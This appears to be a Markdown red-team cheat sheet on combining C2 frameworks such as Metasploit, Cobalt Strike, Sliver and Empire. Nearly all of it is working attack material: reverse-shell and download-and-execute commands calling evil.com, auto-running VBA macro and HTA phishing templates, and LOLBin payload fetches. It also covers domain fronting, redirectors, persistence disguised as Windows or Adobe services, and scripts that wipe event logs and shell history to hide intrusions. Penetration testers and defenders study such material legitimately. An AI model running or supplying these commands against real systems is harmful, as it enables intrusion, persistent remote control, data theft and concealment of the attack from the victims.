# Common C2 Techniques & Cross-Framework Integration

> **Universal techniques applicable across multiple C2 frameworks**

---

## Table of Contents

- [Framework Interoperability](#framework-interoperability)
- [Common Payload Delivery Methods](#common-payload-delivery-methods)
- [Universal OPSEC Practices](#universal-opsec-practices)
- [Cross-Platform Techniques](#cross-platform-techniques)
- [Infrastructure Setup](#infrastructure-setup)
- [Traffic Analysis Evasion](#traffic-analysis-evasion)
- [Multi-Framework Persistence](#multi-framework-persistence)
- [Cleanup Procedures](#cleanup-procedures)

---

## Framework Interoperability

### Session Bridging

```bash
# Metasploit to Cobalt Strike
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST <cs_teamserver>
set LPORT <cs_port>
# Configure Cobalt Strike foreign listener

# Sliver to Empire
# Use Sliver's execute-assembly with Empire stager
sliver (session) > execute-assembly /path/to/empire_stager.exe

# Covenant to Metasploit
# Generate Metasploit payload, execute via Covenant
Covenant > Assembly <metasploit_payload.exe>
```

### Universal Payload Formats

```bash
# Shellcode (works with all frameworks)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f c
sliver > generate --format shellcode --http domain.com
# Inject into custom loaders

# PowerShell (cross-compatible)
# Base64 encoded commands work across all PowerShell-capable frameworks
$command = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Multi-Framework Handlers

```bash
# Multiple listeners for different frameworks
# Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.0.0.1
set LPORT 443
exploit -j

# Sliver
sliver > https --lhost 10.0.0.1 --lport 8443

# Empire
uselistener https
set Host https://10.0.0.1:9443
execute

# Redirect traffic based on User-Agent or other indicators
```

---

## Common Payload Delivery Methods

### Web-Based Delivery

```bash
# Simple HTTP server (works for all frameworks)
python3 -m http.server 8080
php -S 0.0.0.0:8080
ruby -run -e httpd . -p 8080

# Nginx configuration for payload hosting
server {
    listen 80;
    server_name payload.domain.com;
    root /var/www/payloads;
    
    location /legitimate-file.exe {
        alias /var/www/payloads/beacon.exe;
    }
}
```

### Document-Based Delivery

```vba
' Universal VBA macro template
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -w hidden -enc <BASE64_PAYLOAD>"
    Shell cmd, vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

```javascript
// HTA application template
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -w hidden -enc <BASE64_PAYLOAD>", 0, False
    window.close()
</script>
```

### Email-Based Delivery

```bash
# Macro-enabled documents
# 1. Generate payload with any framework
# 2. Convert to VBA macro
# 3. Embed in Word/Excel document
# 4. Send via phishing email

# HTA files via email
# 1. Generate HTA payload
# 2. Host on compromised/legitimate domain
# 3. Send link via email
# 4. Social engineer execution
```

---

## Universal OPSEC Practices

### Process Migration

```bash
# Target trusted processes across all frameworks
svchost.exe                 # Windows Service Host
explorer.exe               # Windows Explorer
dllhost.exe                # COM+ Process
winlogon.exe               # Windows Logon Process
csrss.exe                  # Client/Server Runtime
lsass.exe                  # Local Security Authority (requires SYSTEM)

# Migration commands by framework
# Metasploit
migrate <pid>

# Cobalt Strike
inject <pid> <listener>

# Sliver
migrate <pid>

# Empire
psinject <pid> <listener>
```

### Sleep & Jitter Patterns

```bash
# Recommended sleep intervals
Production: 60-300 seconds
Testing: 5-30 seconds
Red Team: 120-600 seconds

# Jitter percentages
Low profile: 10-30%
Medium profile: 30-50%
High profile: 50-80%

# Implementation examples
# Metasploit
set SessionCommTimeout 300
set SessionExpirationTimeout 604800

# Cobalt Strike
sleep 300 30

# Sliver
set-beacon-interval 300s
set-beacon-jitter 30s

# Empire
sleep 300 30
```

### Traffic Patterns

```bash
# Legitimate User-Agents
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

# Common URI patterns
/search?q=<data>
/images/gallery/<data>
/api/v1/status
/admin/login.php
/content/updates
```

---

## Cross-Platform Techniques

### Windows-Specific

```bash
# Living off the Land Binaries (LOLBins)
powershell.exe             # PowerShell execution
cmd.exe                    # Command prompt
wmic.exe                   # WMI queries
certutil.exe               # Certificate utilities
bitsadmin.exe              # Background transfer
regsvr32.exe               # DLL registration
rundll32.exe               # DLL execution
mshta.exe                  # HTA execution
cscript.exe                # VBScript execution
wscript.exe                # Windows Script Host

# Example usage
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
bitsadmin /transfer job http://evil.com/payload.exe C:\temp\payload.exe
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
```

### Linux-Specific

```bash
# Common Linux binaries
/bin/bash                  # Bash shell
/usr/bin/python            # Python interpreter
/usr/bin/perl              # Perl interpreter
/usr/bin/wget              # Web downloader
/usr/bin/curl              # cURL utility
/usr/bin/nc                # Netcat
/usr/bin/ssh               # SSH client

# Example usage
wget http://evil.com/payload.sh -O /tmp/payload.sh
curl -s http://evil.com/payload.py | python
bash -c "exec 5<>/dev/tcp/evil.com/4444;cat <&5|while read line;do \$line 2>&5 >&5;done"
```

### macOS-Specific

```bash
# macOS utilities
/usr/bin/curl              # cURL (preferred over wget)
/usr/bin/osascript         # AppleScript execution
/bin/launchctl             # Launch daemon control
/usr/bin/python            # Python (built-in)
/usr/bin/ruby              # Ruby (built-in)

# Example usage
osascript -e 'do shell script "curl -s http://evil.com/payload.py | python"'
launchctl load ~/Library/LaunchAgents/com.evil.plist
```

---

## Infrastructure Setup

### Domain Fronting

```bash
# Cloudflare example
Host: cdn.cloudflare.com
Host header: evil.com

# Azure CDN example  
Host: azure-cdn.azureedge.net
Host header: evil.com

# AWS CloudFront example
Host: d111111abcdef8.cloudfront.net
Host header: evil.com

# Configuration in C2 frameworks
# Sliver
generate --http cdn.cloudflare.com --domain evil.com

# Empire
set Host cdn.cloudflare.com
set Headers Host:evil.com

# Cobalt Strike (malleable profile)
http-get {
    set uri "/search";
    client {
        header "Host" "evil.com";
    }
}
```

### Redirectors

```bash
# Apache redirector configuration
<VirtualHost *:80>
    ServerName legitimate.com
    
    # Redirect to team server
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "^Mozilla.*Windows.*Chrome.*"
    RewriteRule ^.*$ https://teamserver.com%{REQUEST_URI} [P]
    
    # Redirect others to legitimate site
    RewriteRule ^.*$ https://google.com [R=302,L]
</VirtualHost>

# Nginx redirector
server {
    listen 80;
    server_name legitimate.com;
    
    location / {
        if ($http_user_agent ~* "Mozilla.*Windows.*Chrome") {
            proxy_pass https://teamserver.com;
        }
        return 302 https://google.com;
    }
}
```

### DNS Setup

```bash
# DNS C2 setup
# 1. Register domain
# 2. Point NS records to your servers
# 3. Configure DNS server for tunneling

# Example DNS records
evil.com.           NS    ns1.evil.com
evil.com.           NS    ns2.evil.com
ns1.evil.com.       A     1.2.3.4
ns2.evil.com.       A     1.2.3.5

# Test DNS resolution
dig @1.2.3.4 test.evil.com
nslookup test.evil.com 1.2.3.4
```

---

## Traffic Analysis Evasion

### SSL/TLS Configuration

```bash
# Generate legitimate-looking certificates
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=US/ST=CA/L=San Francisco/O=Legitimate Corp/CN=legitimate.com"

# Use Let's Encrypt for real certificates
certbot certonly --standalone -d legitimate.com

# Certificate pinning bypass
# Use valid certificates from trusted CAs
# Rotate certificates regularly
# Use multiple certificate authorities
```

### Protocol Mimicry

```bash
# HTTPS over port 443 (most common)
# HTTP over port 80
# DNS over port 53
# SMTP over port 25/587
# FTP over port 21
# SSH over port 22

# Custom protocol examples
# Sliver WireGuard (appears as VPN traffic)
sliver > wg --lhost 0.0.0.0 --lport 51820

# Covenant over legitimate-looking HTTP
# Configure custom HTTP profiles to mimic real applications
```

### Timing Analysis

```bash
# Vary communication timing
# Avoid regular intervals
# Use working hours for callbacks
# Implement random delays

# Example timing strategies
# Business hours: 9 AM - 5 PM callbacks
# Random intervals: 300-1800 seconds
# Burst communication during legitimate activity
# Sleep during off-hours
```

---

## Multi-Framework Persistence

### Registry-Based

```bash
# Windows Run keys (works with all frameworks)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Example entries
"Windows Update" = "C:\Windows\System32\legitimate.exe"
"Security Center" = "powershell -w hidden -enc <BASE64>"
"Adobe Updater" = "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
```

### Service-Based

```bash
# Windows services
sc create "Windows Security Center" binPath= "C:\Windows\System32\legitimate.exe" start= auto
sc description "Windows Security Center" "Provides security notifications and recommendations."

# Linux systemd services
[Unit]
Description=System Security Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/legitimate/monitor.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

### Scheduled Tasks

```bash
# Windows Task Scheduler
schtasks /create /tn "System Maintenance" /tr "C:\Windows\System32\legitimate.exe" /sc daily /st 09:00 /ru SYSTEM

# Linux cron jobs
echo "0 9 * * * /usr/bin/python3 /opt/legitimate/task.py" | crontab -

# macOS Launch Agents
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemmaintenance</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/usr/local/bin/maintenance.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

---

## Cleanup Procedures

### Universal Cleanup Script

```bash
#!/bin/bash
# Universal C2 cleanup script

# Stop all C2 services
pkill -f "sliver"
pkill -f "msfconsole"
pkill -f "empire"
pkill -f "covenant"

# Remove temporary files
rm -rf /tmp/*evil*
rm -rf /tmp/*payload*
rm -rf /tmp/*beacon*
rm -rf /var/tmp/*
rm -rf ~/.cache/*

# Clear command history
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE

# Windows cleanup
# reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EvilEntry" /f
# schtasks /delete /tn "EvilTask" /f
# sc delete EvilService
# wevtutil cl System
# wevtutil cl Security
# wevtutil cl Application

echo "Cleanup completed"
```

### Target System Cleanup

```powershell
# PowerShell cleanup script for Windows targets
# Clear event logs
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | ForEach-Object {wevtutil cl $_.LogName}

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear temp files
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:APPDATA\* -Recurse -Force -ErrorAction SilentlyContinue

# Clear registry entries
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "EvilEntry" -ErrorAction SilentlyContinue

# Clear scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Evil*"} | Unregister-ScheduledTask -Confirm:$false

Write-Output "Target cleanup completed"
```

### Network Cleanup

```bash
# Clear iptables rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Clear DNS cache
systemctl flush-dns        # systemd
dscacheutil -flushcache    # macOS
ipconfig /flushdns         # Windows

# Clear ARP cache
ip neigh flush all         # Linux
arp -d *                   # macOS/Windows

# Reset network interfaces
ip link set dev eth0 down
ip link set dev eth0 up
```

---

## Framework-Specific Integration Examples

### Metasploit + Cobalt Strike

```bash
# Generate Cobalt Strike payload in Metasploit
msfvenom -p windows/meterpreter/reverse_https LHOST=<cs_server> LPORT=<cs_port> -f exe -o cs_payload.exe

# Use Metasploit session to deploy Cobalt Strike
meterpreter > upload cs_payload.exe C:\\temp\\
meterpreter > execute -f C:\\temp\\cs_payload.exe
```

### Sliver + Empire

```bash
# Use Sliver to download and execute Empire stager
sliver (session) > execute wget http://empire.com/stager.ps1 -O /tmp/stager.ps1
sliver (session) > execute powershell -f /tmp/stager.ps1
```

### Multiple Framework Deployment

```bash
# Deploy multiple frameworks for redundancy
# 1. Initial access via Sliver
# 2. Deploy Metasploit for specific post-exploitation
# 3. Deploy Cobalt Strike for long-term access
# 4. Use Empire for PowerShell-specific tasks

# Example workflow
1. Sliver beacon for initial callback
2. Upload Metasploit payload via Sliver
3. Execute Metasploit payload for lateral movement
4. Deploy Cobalt Strike beacon for persistence
5. Use Empire for domain enumeration
```

---

*These techniques are for authorized security testing only. Always ensure proper authorization and follow responsible disclosure practices.*